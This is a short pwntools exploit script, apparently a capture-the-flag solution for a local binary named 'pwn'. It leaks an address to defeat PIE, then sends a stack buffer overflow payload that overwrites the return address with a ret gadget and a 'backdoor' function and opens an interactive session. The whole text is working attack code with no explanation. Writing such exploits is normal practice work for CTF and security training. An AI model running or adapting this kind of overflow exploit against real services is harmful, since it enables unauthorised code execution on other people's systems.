from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

p = process('./pwn')
# p = remote('127.0.0.1',61234)

p.recvuntil(b'>')
p.sendline(b'1')
opt = int(p.recvuntil(b'>')[-16:-1],16)
print(hex(opt))

# p.recvuntil(b'>')
p.sendline(b'2')
payload = b'a'*0x20+b'xdulaker'
p.send(payload)

backdoor = opt - 0x4010 + 0x1249
ret = opt - 0x4010 + 0x1262

p.recvuntil(b'>')
p.sendline(b'3')
payload = b'a'*48+b'a'*8+ p64(ret) +p64(backdoor)
p.recvuntil(b'laker\n')
p.send(payload)
p.interactive()